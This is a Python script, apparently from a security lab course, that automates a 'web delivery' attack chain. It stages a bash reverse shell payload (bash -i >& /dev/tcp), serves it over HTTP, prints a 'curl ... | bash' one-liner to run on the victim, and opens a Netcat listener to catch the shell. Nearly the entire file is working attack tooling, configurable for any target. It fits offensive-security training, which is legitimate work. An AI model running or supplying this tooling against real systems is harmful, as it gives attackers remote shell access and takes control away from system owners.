#!/usr/bin/env python3
"""
attack_server.py — Automated Web Delivery and Reverse Shell Orchestrator
========================================================================
Project 07 · Module 01 · Week 01

Automates the complete 'Web Delivery' attack chain:
  1. Generates a custom bash reverse shell payload
  2. Stages the payload on a local HTTP server
  3. Provides the one-liner command for the victim
  4. Starts a Netcat listener to receive the connection
  5. Cleans up background services on exit

Author : Applied AI Security Projects
Lab    : 192.168.100.0/24 | Kali .10 | Webserver .30
"""

from __future__ import annotations

import argparse
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from typing import NoReturn


# ---------------------------------------------------------------------------
# ANSI color helpers
# ---------------------------------------------------------------------------

_USE_COLOR = sys.stdout.isatty()

def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text

def green(t: str) -> str:  return _c("32;1", t)
def yellow(t: str) -> str: return _c("33", t)
def cyan(t: str) -> str:   return _c("36", t)
def red(t: str) -> str:    return _c("31;1", t)
def grey(t: str) -> str:   return _c("90", t)


# ---------------------------------------------------------------------------
# Core Attack Server
# ---------------------------------------------------------------------------

class AttackServer:
    """
    Manages the lifecycle of a web-delivery attack simulation.
    
    Attributes:
        lhost      Listening host IP (Attacker)
        lport      Listening port for reverse shell
        http_port  Port for the payload delivery web server
        staging_dir Directory where the payload is hosted
    """

    def __init__(self, lhost: str, lport: int, http_port: int) -> None:
        self.lhost = lhost
        self.lport = lport
        self.http_port = http_port
        self.staging_dir = "/tmp/payload_staging"
        self.payload_name = "shell.sh"
        self._web_proc: Optional[subprocess.Popen] = None
        
    def setup_staging(self) -> None:
        """
        Creates the staging directory and generates the shell payload.
        """
        if not os.path.exists(self.staging_dir):
            os.makedirs(self.staging_dir)
            
        payload_content = (
            "#!/bin/bash\n"
            f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\n"
        )
        
        path = os.path.join(self.staging_dir, self.payload_name)
        with open(path, "w") as f:
            f.write(payload_content)
        
        os.chmod(path, 0o755)
        print(cyan(f"[*] Payload staged → {path}"))

    def start_web_server(self) -> None:
        """
        Starts a background Python HTTP server to host the payload.
        """
        print(cyan(f"[*] Starting delivery server on port {self.http_port}..."))
        
        # Using subprocess to run the server in a separate process group
        try:
            self._web_proc = subprocess.Popen(
                [sys.executable, "-m", "http.server", str(self.http_port)],
                cwd=self.staging_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid  # Create a new process group for clean exit
            )
            time.sleep(1) # Let server bind
            print(green(f"[+] Delivery server is LIVE"))
        except Exception as e:
            print(red(f"[!] Failed to start web server: {e}"))
            sys.exit(1)

    def print_instructions(self) -> None:
        """
        Displays the 'one-liner' command for the target machine.
        """
        cmd = f"curl -s http://{self.lhost}:{self.http_port}/{self.payload_name} | bash"
        
        print("\n" + "="*70)
        print(yellow(" INSTRUCTIONS FOR TARGET MACHINE "))
        print("="*70)
        print(f" Execute the following command on the victim to trigger the shell:")
        print(f"\n {green(cmd)}\n")
        print("="*70 + "\n")

    def run_listener(self) -> None:
        """
        Starts the Netcat listener in the foreground.
        """
        print(cyan(f"[*] Starting Netcat listener on {self.lhost}:{self.lport}..."))
        print(grey("    (Wait for connection... Press CTRL+C to terminate everything)"))
        
        try:
            # Replaces the current process with nc for better terminal handling
            # Note: This means cleanup must be handled via signals on the child or a wrapper
            subprocess.run(["nc", "-lvnp", str(self.lport)])
        except KeyboardInterrupt:
            print(yellow("\n[!] Listener interrupted by user."))
        finally:
            self.cleanup()

    def cleanup(self) -> None:
        """
        Terminates the web server and cleans up staged files.
        """
        print(cyan("\n[*] Cleaning up..."))
        if self._web_proc:
            try:
                os.killpg(os.getpgid(self._web_proc.pid), signal.SIGTERM)
                print(grey("    Web server stopped."))
            except ProcessLookupError:
                pass
        
        payload_path = os.path.join(self.staging_dir, self.payload_name)
        if os.path.exists(payload_path):
            os.remove(payload_path)
            print(grey(f"    Payload script removed."))
            
        print(green("[+] Cleanup complete. Happy hunting."))


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Professional Web Delivery Attack Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--lhost", default="192.168.100.10", help="Attacker IP (LHOST)")
    parser.add_argument("--lport", type=int, default=4444, help="Reverse shell port (LPORT)")
    parser.add_argument("--http", type=int, default=8080, help="Payload server port")
    
    args = parser.parse_args()
    
    server = AttackServer(args.lhost, args.lport, args.http)
    
    # Handle CTRL+C explicitly
    def signal_handler(sig, frame):
        server.cleanup()
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)

    print(cyan(f"\n{'-'*10} Attack SIM: Web Delivery {'-'*10}"))
    server.setup_staging()
    server.start_web_server()
    server.print_instructions()
    server.run_listener()

if __name__ == "__main__":
    main()
